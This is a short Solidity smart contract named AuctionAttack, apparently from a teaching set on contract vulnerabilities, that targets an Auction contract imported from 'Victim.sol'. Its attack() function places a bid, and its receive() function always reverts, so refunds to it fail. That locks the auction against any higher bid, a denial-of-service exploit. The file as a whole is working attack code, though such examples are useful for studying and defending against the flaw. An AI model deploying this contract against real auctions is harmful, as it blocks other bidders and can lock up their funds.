//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "./Victim.sol";

import "hardhat/console.sol";

contract AuctionAttack {
    
    Auction public victim;
    
    constructor(address addr){      
         victim = Auction(addr);   
    } 
    
    function attack() payable public {
        victim.bid{value: msg.value}();
    }

    receive() external payable {
        revert();
    }

}